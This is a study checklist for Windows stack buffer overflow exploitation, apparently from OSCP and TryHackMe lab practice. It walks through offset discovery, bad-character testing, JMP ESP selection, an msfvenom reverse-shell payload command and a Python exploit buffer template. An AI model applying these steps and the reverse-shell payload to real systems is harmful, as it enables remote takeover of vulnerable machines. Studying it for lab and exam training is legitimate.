- [ ] Set the config directory for files generated by mona.py `!mona config -set workingfolder c:\Users\x3rz\Desktop\%`
- [ ] Find the buffer that crashes the application. (connect.py)
- [ ] Find the offset loaction by sending circular pattern made by `pattern_create.py -l no_of_offset` then use `!mona findmsp -distance <no_of_offset>` to find the esp 		offset.
- [ ] Validate the offset (validate.py)
- [ ] Now you have offset time to find badchars. (badchars.py)
	- Generate a bytearray `!mona bytearray -cpb '\x00'` 
	- Send that generate code into application.
	- Then check the badchars `!mona cmp -a esp -f bytearray.bin`
	- Now check if 
		- We can see the bad characters are **"\x00\x07\x08\x2e\x2f\xa0\xa1"** but **not all of these** are bad chars. Occasionally bad chars cause the next byte to become corrupted or effect the rest of the string.
		- Because the idea is that the next byte is the corrupted one, we can surmmise that the invalid chars are ""\x08\x2f\xa1" making "\x00\x07\x2e\xa0" the actual bad chars. As I said we can test for this manually **By crafting bytearray again MUST SEE OVERFLOW9 from tryhackme oscp.**

- [ ] Find the JMP ESP by `!mona jmp -r esp -cpb 'no_of_badchars'`. or find them in modules by specifying modules that have similar name to application `-m`
- [ ] Set the intrrupt INT3 at the ESP by putting JMP ESP addr in EIP (intrrupt.py) {Use of struct to provide the address of JMP ESP in little endian}
- [ ] Now check when you sent 4 INT3 so they should reflect 4 or 3 INT3 then go for the shell otherwise if less than 3 then Append a character "Z" before ESP or after 		EIP.
- [ ] For the shell craft a payload from msfvenom `msfvenom -p wiondows/shell_reverse_tcp LHOST=IP LPORT=port EXITFUNC=thread -v shell_code -f py -b 'no_of_badchars'`

- [ ] Now most important thing in getting shell is bypasing GETPC means Get program counter which comes with the encoded payload from msfvenom. To do this we need to shift the ESP far away from actull position by subtraction bytes that are  multiple of 4  `ex: sub esp,0x10 i.e 0x10 = 16` 

- [ ] address you got from entring that assembly code in `metasm_shell.rb` 
	ex: you got 
	metasm > sub esp,0x10
			 "\x83\xec\x10"

- [ ] Now out shell requirements are ready. (shell.py)

Our Final payload buffer.

```python
buff = ""
buff += "A"*(offset_srp - len(buff)) # padding
buff += struct.pack("<I", ptr_jmp_esp) # SRP overwrite where EIP gets overwritten
buff += subtract_esp_10 # ESP points here 4 total intrrupts
buff += shell_code
buff += "D"*(total_len - len(buff)) # trailing padding
buff += "\n"
```

For further reference check out the obsdian notes.


## TIPS THAT MIGHT HELP


1. Increase the value of buffer x2 ex: 1024, 2048 and so on.
2. In some cases if you sent 4 INT3 but there you seeing 3 INT3 and then do one thing that is scroll up and check if they are still 3 or now they are 2 INT3 but now if you see 2 then try appeneding Z  after EIP and before esp
3. In the case of normal input like in Overflow1 or vulnserver then `\r\n` should be appeneded at the end of sending via python.
4. At the single commmand send do try adding `\n` e.i: buff += '\n'.
5. *From overflow2* : 

6. We can also use `!mona findmsp -distance 1000` here 1000 is equal to the number of buffer you sent like if 1024 then `!mona findmsp -distance 1024` it will find you the position of EIP automatically. after creating payload with offset_create.rb
7. If you think that you found right bad characters and still your payload doesnt work then try using this `!mona jmp -r esp -cpb <all_badchars>` use this jmp esp addr of this command.

